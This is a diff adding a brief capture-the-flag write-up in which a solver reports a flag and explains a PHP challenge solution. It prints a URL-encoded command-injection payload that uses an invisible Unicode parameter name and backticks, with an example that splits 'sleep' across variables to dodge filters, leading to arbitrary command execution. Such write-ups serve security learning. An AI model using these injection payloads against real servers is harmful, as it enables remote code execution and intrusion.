@@ -1,0 +1,18 @@
+My name is kaibro
+I got the flag.
+flag[happy_ðŸŒš_new_year]
+
+My writeup:
+after the request:
+     ?%E2%81%A3=`$_`;//;
+can construct shell command
+
+e.g. ?%E2%81%A3=`$_`;//;a=sle;b=ep;$a$b 10;
+
+and then I can write shellscript or php script to /tmp/
+
+
+so I write a python script to execute arbitrary cmd
+
+Nice problem
+Thanks
